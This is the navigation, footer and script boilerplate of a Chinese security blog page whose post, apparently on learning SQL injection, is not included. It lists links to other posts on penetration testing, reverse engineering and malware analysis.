class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPXlvdXJuYW1l" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;yourname"><i class="ic i-cloud-music"></i></span> <span class="exturl item weibo" data-url="aHR0cHM6Ly93ZWliby5jb20veW91cm5hbWU=" title="https:&#x2F;&#x2F;weibo.com&#x2F;yourname"><i class="ic i-weibo"></i></span> <span class="exturl item youtube" data-url="aHR0cHM6Ly95b3V0dWJlLmNvbS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;youtube.com&#x2F;yourname"><i class="ic i-youtube"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/Programming/Python/python%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/Internet/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%88SSH%E9%9A%A7%E9%81%93%EF%BC%89%E3%80%90%E8%BD%AC%E3%80%91/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/BigData/" title="分类于 大数据">大数据</a></div><span><a href="/BigData/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0/" title="大数据学习">大数据学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PenetrationTest/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/PenetrationTest/PostPenetration/" title="分类于 后渗透">后渗透</a></div><span><a href="/PenetrationTest/PostPenetration/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/" title="CobaltStrike攻击模块的使用">CobaltStrike攻击模块的使用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PenetrationTest/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/PenetrationTest/Web-Security/" title="分类于 web安全">web安全</a></div><span><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="web漏洞-业务逻辑漏洞">web漏洞-业务逻辑漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/" title="分类于 内核学习">内核学习</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/Drive-Development/" title="分类于 驱动开发">驱动开发</a></div><span><a href="/Bin/Core/Drive-Development/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-64%E4%BD%8D%E4%B8%8E32%E4%BD%8D%E5%86%85%E6%A0%B8%E5%BC%80%E5%8F%91%E5%B7%AE%E5%BC%82/" title="驱动开发-64位与32位内核开发差异">驱动开发-64位与32位内核开发差异</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/" title="分类于 内核学习">内核学习</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/" title="分类于 WindowsXp">WindowsXp</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/SystemCall/" title="分类于 系统调用">系统调用</a></div><span><a href="/Bin/Core/WindowsXp/SystemCall/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-SSDT%E5%B8%B8%E8%A7%84HOOK/" title="系统调用-SSDT常规HOOK">系统调用-SSDT常规HOOK</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Programming/" title="分类于 编程">编程</a> <i class="ic i-angle-right"></i> <a href="/categories/Programming/Python/" title="分类于 Python">Python</a></div><span><a href="/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/" title="BHP第二章（三）-SSH与SSH隧道">BHP第二章（三）-SSH与SSH隧道</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/" title="分类于 内核学习">内核学习</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/Drive-Development/" title="分类于 驱动开发">驱动开发</a></div><span><a href="/Bin/Core/Drive-Development/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-0%E7%8E%AF%E4%B8%8E3%E7%8E%AF%E7%9A%84%E9%80%9A%E4%BF%A1%EF%BC%88%E5%B8%B8%E8%A7%84%E6%96%B9%E6%B3%95%EF%BC%89/" title="驱动开发-0环与3环的通信（常规方法）">驱动开发-0环与3环的通信（常规方法）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/MalwareAnalysis/" title="分类于 恶意代码分析">恶意代码分析</a></div><span><a href="/Bin/MalwareAnalysis/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E7%AC%AC0%E7%AB%A0/" title="恶意代码分析实战-第0章">恶意代码分析实战-第0章</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/mysql/" title="分类于 mysql">mysql</a></div><span><a href="/PenetrationTest/Web-Security/get%E4%B8%80%E4%B8%AAmysql%E7%9F%A5%E8%AF%86/" title="get一个mysql知识">get一个mysql知识</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PenetrationTest/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/PenetrationTest/Web-Security/" title="分类于 web安全">web安全</a></div><span><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-CSRF/" title="web漏洞-CSRF">web漏洞-CSRF</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Or0kit @ Or0kit</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">1.5m 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">22:29</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"PenetrationTest/Web-Security/初学SQLinjection/",favicon:{show:"╰(*°▽°*)╯正在变强中",hide:"(ー`′ー)快回来"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{scale:1,hHeadPos:.5,vHeadPos:.618,jsonPath:"/live2dw/assets/koharu.model.json"},display:{superSample:2,width:150,height:300,position:"right",hOffset:0,vOffset:-20},mobile:{show:!0,scale:.5},react:{opacityDefault:.7,opacityOnHover:.8},log:!1})</script></body></html><!-- rebuild by hrmmi -->